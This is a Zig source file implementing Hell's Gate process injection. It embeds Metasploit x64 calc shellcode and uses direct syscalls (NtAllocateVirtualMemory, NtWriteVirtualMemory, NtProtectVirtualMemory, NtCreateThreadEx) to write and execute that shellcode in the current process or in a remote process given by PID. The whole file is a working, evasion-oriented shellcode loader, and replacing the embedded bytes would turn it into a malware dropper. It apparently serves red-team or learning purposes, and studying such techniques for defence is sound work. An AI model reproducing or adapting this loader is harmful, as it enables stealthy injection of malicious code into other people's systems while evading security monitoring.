const std = @import("std");
const print = std.debug.print;
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

// Import Hell's Gate module
const hell = @import("hell.zig");

// Windows types and constants
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const ULONG = windows.ULONG;
const LPVOID = windows.LPVOID;
const PBYTE = [*]u8;
const BOOL = windows.BOOL;
const SIZE_T = usize;
const LPCSTR = windows.LPCSTR;
const PDWORD = *DWORD;

const GENERIC_READ = windows.GENERIC_READ;
const OPEN_EXISTING = windows.OPEN_EXISTING;
const FILE_ATTRIBUTE_NORMAL = windows.FILE_ATTRIBUTE_NORMAL;
const INVALID_HANDLE_VALUE = @as(HANDLE, @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))));
const INVALID_FILE_SIZE = 0xFFFFFFFF;
const HEAP_ZERO_MEMORY = 0x00000008;
const FALSE = windows.FALSE;

// Configuration - comment/uncomment to switch between local and remote injection
const LOCAL_INJECTION = false;
const REMOTE_INJECTION = !LOCAL_INJECTION;
const PROCESS_ID: DWORD = 45768; // Change this to target process ID for remote injection

// x64 calc metasploit shellcode (embedded from C code)
const Payload = [_]u8{
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,
};

// External Windows API functions
extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?HANDLE;
extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;
extern "kernel32" fn GetCurrentProcess() callconv(WINAPI) HANDLE;
extern "kernel32" fn GetThreadId(Thread: HANDLE) callconv(WINAPI) DWORD;

// Read a character from stdin (equivalent to getchar())
fn waitForEnter(message: []const u8) void {
    print("{s}", .{message});
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

// Classic injection using Hell's Gate syscalls (Zig version of the C function)
fn classicInjectionViaSyscalls(vx_table: *hell.VX_TABLE, process_handle: HANDLE, payload: [*]const u8, payload_size: SIZE_T) bool {
    const nt_success = hell.NTSTATUS.SUCCESS;
    var status: hell.NTSTATUS = nt_success;
    var address: ?hell.PVOID = @ptrFromInt(0);
    var old_protection: hell.ULONG = 0;
    var size: SIZE_T = payload_size;
    var bytes_written: SIZE_T = 0;
    var thread_handle: HANDLE = undefined;

    // Step 1: Allocate memory using Hell's Gate
    hell.hells_gate(vx_table.NtAllocateVirtualMemory.system_call);
    status = hell.hell_descent(@intFromPtr(process_handle), @intFromPtr(&address), 0, @intFromPtr(&size), hell.MEM_RESERVE | hell.MEM_COMMIT, hell.PAGE_READWRITE, 0, 0, 0, 0, 0);

    if (status != nt_success) {
        print("[!] NtAllocateVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
        return false;
    }

    print("[+] Allocated Address At : 0x{X} Of Size : {d}\n", .{ @intFromPtr(address), size });
    waitForEnter("[#] Press <Enter> To Write The Payload ... ");

    // Step 2: Write the payload
    print("\t[i] Writing Payload Of Size {d} ... ", .{payload_size});
    hell.hells_gate(vx_table.NtWriteVirtualMemory.system_call);
    status = hell.hell_descent(@intFromPtr(process_handle), @intFromPtr(address), @intFromPtr(payload), payload_size, @intFromPtr(&bytes_written), 0, 0, 0, 0, 0, 0);

    if (status != nt_success or bytes_written != payload_size) {
        print("[!] NtWriteVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
        print("[i] Bytes Written : {d} of {d}\n", .{ bytes_written, payload_size });
        return false;
    }
    print("[+] DONE\n", .{});

    // Step 3: Change memory protection to executable
    hell.hells_gate(vx_table.NtProtectVirtualMemory.system_call);
    status = hell.hell_descent(@intFromPtr(process_handle), @intFromPtr(&address), @intFromPtr(&payload_size), hell.PAGE_EXECUTE_READWRITE, @intFromPtr(&old_protection), 0, 0, 0, 0, 0, 0);

    if (status != nt_success) {
        print("[!] NtProtectVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
        return false;
    }

    // Step 4: Execute the payload via thread
    waitForEnter("[#] Press <Enter> To Run The Payload ... ");
    print("\t[i] Running Thread Of Entry 0x{X} ... ", .{@intFromPtr(address)});
    hell.hells_gate(vx_table.NtCreateThreadEx.system_call);
    status = hell.hell_descent(@intFromPtr(&thread_handle), hell.THREAD_ALL_ACCESS, 0, // NULL object attributes
        @intFromPtr(process_handle), @intFromPtr(address), 0, // NULL parameter
        0, // Create flags
        0, // Stack zero bits
        0, // Size of stack commit
        0, // Size of stack reserve
        0 // Bytes buffer
    );

    if (status != nt_success) {
        print("[!] NtCreateThreadEx Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
        return false;
    }
    print("[+] DONE\n", .{});
    print("\t[+] Thread Created With Id : {d}\n", .{GetThreadId(thread_handle)});

    return true;
}

pub fn main() !void {
    print("[*] hell's gate process injection\n", .{});

    // 讀命令列參數
    const gpa = std.heap.page_allocator;
    const args = try std.process.argsAlloc(gpa);
    defer std.process.argsFree(gpa, args);

    if (REMOTE_INJECTION) {
        if (args.len < 2) {
            print("Usage:\n  {s} <pid>\n", .{args[0]});
            std.process.exit(2);
        }
    }

    // 解析 pid（十進位或 0x 前綴的十六進位）
    var process_id: DWORD = 0;
    if (REMOTE_INJECTION) {
        const pid_str = args[1];
        const is_hex = pid_str.len >= 2 and (pid_str[0] == '0' and (pid_str[1] == 'x' or pid_str[1] == 'X'));
        const base: u8 = if (is_hex) 16 else 10;

        const start_idx: usize = if (is_hex) 2 else 0;
        if (start_idx >= pid_str.len) {
            print("[-] Invalid PID\n", .{});
            std.process.exit(2);
        }

        const pid_u64 = try std.fmt.parseInt(u64, pid_str[start_idx..], base);
        if (pid_u64 > std.math.maxInt(DWORD)) {
            print("[-] PID is larger then u32\n", .{});
            std.process.exit(2);
        }
        process_id = @as(DWORD, @intCast(pid_u64));
    }

    // 檢查 Hell's Gate 可用性
    if (!hell.isAvailable()) {
        print("[-] Hell's Gate technique not available (requires Windows 10)\n", .{});
        std.process.exit(1);
    }

    // 初始化 VX table
    var vx_table = hell.init_vx_table() orelse {
        print("[-] Failed to initialize Hell's Gate VX table\n", .{});
        std.process.exit(1);
    };

    print("\n[*] VX Table initialized successfully\n", .{});
    print("[*] Payload size: {d} bytes\n", .{Payload.len});

    var success = false;

    if (LOCAL_INJECTION) {
        print("[*] Performing LOCAL injection (current process)\n", .{});
        const current_process = @as(HANDLE, @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))));
        success = classicInjectionViaSyscalls(&vx_table, current_process, &Payload, Payload.len);
    } else if (REMOTE_INJECTION) {
        print("[i] Targeting process of id : {d}\n", .{process_id});
        const target_process = OpenProcess(hell.PROCESS_ALL_ACCESS, FALSE, process_id) orelse {
            print("[!] OpenProcess Failed With Error : {d}\n", .{GetLastError()});
            std.process.exit(1);
        };
        defer _ = CloseHandle(target_process);

        print("[*] Performing REMOTE injection\n", .{});
        success = classicInjectionViaSyscalls(&vx_table, target_process, &Payload, Payload.len);
    }

    if (success) {
        print("\n[+] Injection completed successfully!\n", .{});
    } else {
        print("\n[-] Injection failed!\n", .{});
        std.process.exit(1);
    }

    waitForEnter("[#] Press <Enter> To Quit ... ");
}
